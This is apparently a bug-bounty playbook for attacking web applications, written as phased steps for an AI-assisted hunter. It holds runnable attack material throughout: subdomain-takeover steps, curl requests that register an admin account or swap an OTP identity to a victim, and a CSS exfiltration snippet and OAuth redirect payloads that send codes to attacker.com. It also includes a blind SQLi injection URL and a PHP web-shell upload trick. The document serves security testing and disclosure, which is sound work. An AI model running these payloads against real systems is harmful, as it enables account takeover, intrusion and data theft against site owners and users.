# Web Application Security Hunt

**Target Type:** Web applications with authentication, OAuth, forms, APIs

**Skills Used:**
- yandex-recon-specialist.md
- oauth-security-auditor.md
- parser-differential-tester.md
- ai-self-validator.md
- (OPTIONAL: route to `08-otp-auth-bypass.md` if OTP/2FA flow detected)

**Expected Time:** 2-4 hours per target

**New in 2026-05-25 update:**
- Phase 0.5: CSP Header Recon (Entry #180)
- Phase 2.6: Stateless Verification ID / OTP Bypass (Entry #178, #183)
- Phase 3.5: XML Error-Based Blind SQLi (Entry #179)
- Phase 3.6: Subdomain Takeover (Entry #181)

---

## Phase 1: Reconnaissance (30-60 min)

### Step 1.1: Yandex Dorking
**Activate:** `yandex-recon-specialist.md`

**Actions:**
```bash
# Run automated Yandex recon
./yadexloop.sh target.com

# Expected outputs:
# - api.txt (API endpoints)
# - javascript.txt (JS files)
# - auth_admin.txt (login/admin pages)
# - environments.txt (staging/dev)
# - files.txt (config/secrets)
```

**What to Look For:**
- OAuth endpoints (`/oauth/`, `/auth/`, `/login`)
- API endpoints (`/api/`, `/graphql`, `/swagger`)
- Admin panels (`/admin`, `/dashboard`)
- JavaScript files (`_next/static`, `chunk.js`)
- Staging environments (`staging.`, `dev.`, `test.`)

### Step 1.2: Subdomain Enumeration
**Continue with:** `yandex-recon-specialist.md`

**Actions:**
```bash
# Letter-by-letter subdomain brute-force
for letter in {a..z}; do
  yandex search: rhost:com.target.${letter}*
done
```

**Document:**
- All discovered subdomains
- Interesting patterns (api., auth., admin., etc.)

### Step 1.3: JavaScript Analysis
**Actions:**
```bash
# Download all JS files
cat javascript.txt | while read url; do
  wget -q "$url" -P js_files/
done

# Extract endpoints
grep -roh "https://[^\"']*" js_files/ | sort -u > extracted_endpoints.txt
```

**What to Look For:**
- API keys (hardcoded)
- Internal endpoints
- OAuth client IDs
- GraphQL schemas

---

## Phase 1.5: CSP Header Recon (NEW — Entry #180)

**Critical recon step that most hunters miss.** CSP headers often reveal backend origins, staging environments, and admin panels not visible via other recon.

### Step 1.5.1: Extract CSP Headers
**Actions:**
```bash
# Get CSP from main domain
curl -I https://target.com | grep -i "content-security-policy"

# Capture full header for analysis
curl -I https://target.com > csp_headers.txt
```

**Look for whitelisted origins in:**
- `connect-src` — API endpoints, fetch destinations
- `img-src` — image sources (often reveal CDN/backend)
- `script-src` — JS sources (may include staging)
- `frame-src` — iframe sources (may reveal admin panels)
- `form-action` — form submission targets
- `media-src` — media sources

### Step 1.5.2: Enumerate Backend Origins
**For each domain in CSP, check:**
```bash
# Is the origin accessible directly?
curl -I https://example.sample.dev

# Does it have admin endpoints?
curl https://example.sample.dev/admin/
curl https://example.sample.dev/admin/register
curl https://example.sample.dev/install
curl https://example.sample.dev/setup
curl https://example.sample.dev/dashboard
```

**Common finds:**
- CMS admin panels with open registration → full admin takeover
- Staging environments with weaker auth
- Backend APIs not intended for public access
- Internal dashboards

### Step 1.5.3: PoC Example
```bash
# 1. Main domain CSP reveals: connect-src 'self' https://example.sample.dev
# 2. Visit the leaked origin
curl https://example.sample.dev
# 3. Find /admin/register endpoint
curl https://example.sample.dev/admin/register
# 4. Register arbitrary admin
curl -X POST https://example.sample.dev/admin/register \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"P@ss123!","email":"a@a.com"}'
# 5. Login → full CMS compromise
```

**Impact:** Backend origins exposed via CSP = full admin takeover via open `/admin/register`, `/install`, or `/setup` endpoints.

**Source:** Entry #180

---

## Phase 1.6: Subdomain Takeover (NEW — Entry #181)

**Complete subdomain takeover playbook.** A company points a subdomain at Heroku/GitHub Pages/S3/Azure, stops using the service, but never deletes the DNS record. Claim that service name and own their subdomain.

### Step 1.6.1: Enumerate Subdomains
```bash
# Combine multiple sources
subfinder -d target.com -o subs_subfinder.txt
amass enum -d target.com -o subs_amass.txt

# Certificate Transparency logs (often leak forgotten subs)
curl "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u > subs_crtsh.txt

# Combine all
cat subs_*.txt | sort -u > subs_all.txt
```

### Step 1.6.2: Find Dangling CNAMEs
```bash
# Resolve all and find CNAMEs
dnsx -l subs_all.txt -cname -resp -o dangling_cnames.txt

# Filter to only CNAMEs pointing to external services
cat dangling_cnames.txt
```

**Common target services:**
- Heroku (`*.herokuapp.com`)
- GitHub Pages (`*.github.io`)
- AWS S3 (`*.s3.amazonaws.com`)
- Azure (`*.azurewebsites.net`, `*.cloudapp.net`)
- Shopify (`*.myshopify.com`)
- Fastly (`*.fastly.net`)
- Pantheon (`*.pantheonsite.io`)
- Tumblr (`*.tumblr.com`)
- WordPress.com (`*.wordpress.com`)

### Step 1.6.3: Fingerprint Dead Services
```bash
# Check with subzy
subzy run --targets subs_all.txt

# Or with nuclei
nuclei -l subs_all.txt -t takeovers/ -o takeover_findings.txt
```

**Look for service-specific error messages:**
- "There isn't a GitHub Pages site here"
- "NoSuchBucket" (S3)
- "No such app" (Heroku)

### Step 1.6.4: Confirm Unclaimed
- Visit the URL in browser → screenshot the error
- Confirm DNS record still points there
- Verify the service name isn't taken

### Step 1.6.5: Claim the Subdomain
**For each service:**
- Heroku: `heroku create <service-name>` and deploy
- GitHub Pages: create repo, enable Pages
- S3: create bucket with exact name
- Azure: create app service with exact name

### Step 1.6.6: Report Around Impact
**Always frame around impact (moves low → high):**
- Phishing on trusted domain (`*.company.com` is trusted)
- Cookie theft scoped to wildcard domain
- Bypassing OAuth redirect_uri whitelists
- Email spoofing (SPF/DKIM bypass via trusted subdomain)
- Content injection visible to all users

**Source:** Entry #181

---

## Phase 2: OAuth Security Testing (60-90 min)

**IF OAuth/SSO detected → Activate:** `oauth-security-auditor.md`

### Step 2.1: OAuth Flow Discovery
**Actions:**
1. Identify OAuth providers (Google, GitHub, Facebook, etc.)
2. Map OAuth channels (web, mobile, API)
3. Document OAuth parameters (client_id, redirect_uri, scope, state)

### Step 2.2: Popup Hijacking Test
**Test for:** Predictable window.open() targets

**PoC:**
```html
<iframe name="oauth-window" src="https://target.com/static/chunk.js"></iframe>
<script>
  // Wait for victim to initiate OAuth
  // OAuth loads in our iframe instead of new window
</script>
```

**Success Criteria:**
- OAuth callback loads in attacker's iframe
- Can capture authorization code

### Step 2.3: redirect_uri Bypass
**Test for:** Double-decode, at-sign tricks, path traversal

**Fuzzing Script:**
```bash
# Test double-encode patterns
for byte1 in {00..ff}; do
  for byte2 in {00..ff}; do
    payload="https://attacker.com%25${byte1}%${byte2}target.com/callback"
    # Test payload
  done
done
```

**Success Criteria:**
- Validator sees target.com
- Browser redirects to attacker.com
- Authorization code leaked

### Step 2.4: Non-Happy Path Testing
**Test for:** Error condition exploitation

**Actions:**
1. Change response_type to invalid value
2. Observe error handling
3. Check if fragments preserved through redirects
4. Test if referer manipulation possible

### Step 2.5: Token Theft Techniques
**Test for:**
- CSS data exfiltration
- Referrer Policy override
- XSS in OAuth callback pages

**CSS Exfiltration PoC:**
```css
input[value^="a"] { background: url(https://attacker.com/?c=a); }
input[value^="b"] { background: url(https://attacker.com/?c=b); }
/* ... for all characters ... */
```

---

## Phase 2.5: OTP / Auth Bypass Testing (NEW — Entries #178, #183)

**For any auth flow with OTP, magic link, email verification, or 2FA:** test the **stateless verificationId** pattern.

> **For comprehensive OTP testing, route to `08-otp-auth-bypass.md`.** This is a quick on-target check.

### Step 2.5.1: Identify Verification Flows
- [ ] Login with email OTP
- [ ] Email verification on signup
- [ ] Password reset via OTP
- [ ] 2FA / MFA challenge
- [ ] "Verify OTP to Continue" pages

### Step 2.5.2: Test Identity Field Swap
```bash
# Step 1: Initiate flow as attacker
curl -X POST https://target.com/api/auth/email \
  -H "Content-Type: application/json" \
  -d '{"loginId":"attacker@you.com"}'
# Save the verificationId

# Step 2: Receive OTP at attacker's email
# (intercept or read your own email)

# Step 3: At verification, swap identity to victim
curl -X PUT https://target.com/api/auth/email \
  -H "Content-Type: application/json" \
  -d '{
    "loginId": "victim@target.com",
    "otp_code": "123456",
    "verificationId": "KC:6BE2..."
  }'

# Vulnerable: 200 OK + victim's tokens
# Secure: 400/401 — verification doesn't match
```

### Step 2.5.3: Test OTP Bypass via Replay
- Capture session cookie from OTP page
- Replay GET request to authenticated endpoint directly
- Check if server enforces OTP completion server-side

**Source:** Entries #178, #183

---

## Phase 3: Parser Differential Testing (30-60 min)

**Activate:** `parser-differential-tester.md`

### Step 3.1: Query String Confusion
**Test for:** Duplicate parameter handling

**PoC:**
```
?admin=false&admin=true

WAF checks first: admin=false (allowed)
App uses last: admin=true (bypassed!)
```

### Step 3.2: URL Parser Confusion
**Test for:** Authority confusion

**PoC:**
```
https://target.com@attacker.com/
https://target.com\@attacker.com
https://target.com%00@attacker.com
```

### Step 3.3: Content-Type Confusion
**Test for:** MIME type mismatch

**PoC:**
```
Upload PHP file:
Content-Type: image/jpeg
Filename: shell.php

Validator checks Content-Type → allowed
Handler uses extension → executes!
```

### Step 3.4: Encoding Differentials
**Test for:** Double encoding, null bytes

**PoC:**
```
%252F → %2F → /
file.php%00.jpg
```

### Step 3.5: XML Error-Based Blind SQLi (NEW — Entry #179)

**For when standard SQLi tools fail (sqlmap false positive, no time-based oracle).** Make the database answer yes/no questions by crashing on purpose.

**The Trick:**
- WAF watches for SQL keywords, not XML errors
- Wrap `CASE WHEN` around XML casts
- If condition true: parses broken XML → throws HTTP 500
- If condition false: parses clean XML → returns HTTP 200
- sqlmap has no built-in vector for this

**PoC pattern:**
```sql
-- TRUE branch: broken XML
CASE WHEN (condition)
  THEN XMLAgg(XMLElement("root", '<'))
-- FALSE branch: clean XML
  ELSE XMLAgg(XMLElement("root", '/'))
END
```

**Test:**
```bash
# Try the technique in known-injectable param
curl "https://target.com/api/search?q=test%27)%20AND%201=CASE%20WHEN%20(1=1)%20THEN%20XMLAgg(XMLElement(%22root%22,%20%27%3C%27))%20ELSE%20XMLAgg(XMLElement(%22root%22,%20%27/%27))%20END--"

# Note 1=1 branch should return 500, 1=2 should return 200
```

**Use case:** When sqlmap reports false positive but you know injection exists. Build oracle character-by-character for database/schema extraction.

**Recommended:** Use Claude Code mapped to DeepSeek V4 Pro for this technique (per original writeup — figured out the trick in 2 hours for $0.20).

**Source:** Entry #179

---

## Phase 4: Validation (30 min)

**Activate:** `ai-self-validator.md`

### Step 4.1: Challenge Each Finding
**For each potential vulnerability:**

1. **Trace Real Flow**
   - Don't assume based on endpoint names
   - Follow actual code execution
   - Verify data flow end-to-end

2. **Test Protections**
   - Check Origin enforcement
   - Check Referer enforcement
   - Test CSRF tokens
   - Verify authentication requirements

3. **Prove Exploitability**
   - Build working PoC
   - Test in realistic scenario
   - Verify impact is real, not theoretical

4. **Challenge Assumptions**
   - What could make this a false positive?
   - What protections might I have missed?
   - Is there a legitimate reason for this behavior?

### Step 4.2: Devil's Advocate
**Questions to Ask:**
- Can I actually exploit this?
- Does the attack work cross-origin?
- Is the impact real or theoretical?
- Have I tested all protection mechanisms?

### Step 4.3: Decision
**Only Two Outcomes:**
- ✅ **ACCEPT:** Exploitability proven, all protections tested and bypassed
- ❌ **REJECT:** Protections in place, cannot prove exploitability

---

## Phase 5: Reporting (30 min)

### Step 5.1: Document Finding
**Required Information:**
- Vulnerability type
- Affected endpoint/component
- Step-by-step reproduction
- Working PoC (curl command or script)
- Impact analysis
- Suggested remediation

### Step 5.2: Create PoC
**Deterministic PoC (not just theory):**
```bash
# OAuth redirect_uri bypass example
curl -X GET "https://target.com/oauth/authorize" \
  -H "Cookie: session=VICTIM_SESSION" \
  -d "client_id=CLIENT_ID" \
  -d "redirect_uri=https://attacker.com%2523%40target.com/callback" \
  -d "response_type=code"

# Expected: Authorization code leaked to attacker.com
```

### Step 5.3: Log Result
**Manual logging:**
```bash
echo "$(date) | target.com | OAuth redirect_uri bypass | CRITICAL | $14,000" >> hunt-log.txt
```

---

## Success Criteria

### Critical Findings
- ✅ OAuth account takeover (one-click)
- ✅ Authentication bypass
- ✅ Authorization bypass (admin access)
- ✅ RCE via file upload

### High Findings
- ✅ OAuth token theft
- ✅ CSRF on state-changing endpoints
- ✅ XSS (stored or reflected)
- ✅ IDOR with sensitive data access

### Medium Findings
- ✅ Information disclosure
- ✅ Open redirect
- ✅ Missing security headers

---

## Common Patterns (From 72 Resources)

### OAuth Vulnerabilities (8 entries, $12,700+ bounties)
- Popup hijacking via predictable window names
- redirect_uri bypass via double-decode
- Non-happy path exploitation
- CSS data exfiltration ($9,700)
- Referrer Policy override (Chrome 0-day)

### Parser Differentials (Entry #57)
- Query string confusion (first vs last parameter)
- URL authority confusion
- Content-Type mismatch
- Encoding differentials

### Validation Failures (Entry #5)
- 80% of findings fail at validation stage
- Most common: Assumed vulnerability without testing protections
- Solution: Challenge every finding before reporting

---

## Tools Required

### Essential
- Burp Suite (request interception)
- curl (PoC testing)
- Browser DevTools (OAuth flow analysis)

### Specialized
- Yandex search (recon)
- ffuf (fuzzing)
- nuclei (automated scanning)

### Optional
- MCP Inspector (OAuth debugging)
- Playwright (headless browser testing)

---

## Time Allocation

| Phase | Time | Priority |
|-------|------|----------|
| Recon | 30-60 min | HIGH |
| OAuth Testing | 60-90 min | CRITICAL (if OAuth present) |
| Parser Testing | 30-60 min | HIGH |
| Validation | 30 min | CRITICAL |
| Reporting | 30 min | HIGH |

**Total:** 2-4 hours per target

---

## When Stuck

> **Primary lookup:** `resources/VULN-INDEX.md` — 13 vuln classes mapped to exact INBOX entries

| Stuck On... | VULN-INDEX Section | Key Entry |
|---|---|---|
| XSS blocked by CSP/WAF | XSS → CSP bypass, Sanitizer API | #062, #170, #175 |
| OAuth hardened, no popup | OAuth → redirect_uri, non-happy path | #048, #053, #054 |
| CSRF tests failing | CSRF → Content-Type bypass + XS-Leak | #049 |
| Can't find injection points | Recon → Yandex, subdomain, CT logs | #004, #013, #112, #115 |
| Parser diff not working | XSS → Parser differential, URL authority | #057, #069 |

**Cross-domain pivot:** `resources/CROSS-DOMAIN-MAP.md` — Web OAuth → Mobile custom URL scheme hijacking (#018, #064)
**Fallback:** Try `05-adaptive-hunt.md` (systematic pivot through every technique)

---

## Next Steps After This Workflow

1. **If stuck:** Try `02-api-security-hunt.md` (focus on API endpoints)
2. **If AI features found:** Try `03-ai-app-hunt.md` (prompt injection)
3. **If crypto/DeFi:** Try `04-crypto-hunt.md` (smart contracts)
4. **If nothing found:** Try `05-adaptive-hunt.md` (less common techniques)

---

## References
- Entry #18: OAuth Popup Hijacking
- Entry #48: OAuth redirect_uri Double-Decode ($14k equivalent impact)
- Entry #53: OAuth Non-Happy Path ($3k)
- Entry #57: Parser Differentials for XSS
- Entry #5: AI Self-Validation (80% FP reduction)
- **Entry #180: CSP Header Recon → CMS Admin Takeover**
- **Entry #181: Subdomain Takeover Complete Playbook**
- **Entry #178: OTP Bypass via Stateless Verification ID**
- **Entry #183: Full ATO via OTP Verification Logic Flaw ($3k)**
- **Entry #179: XML Error-Based Blind SQLi (DeepSeek V4 Pro trick)**
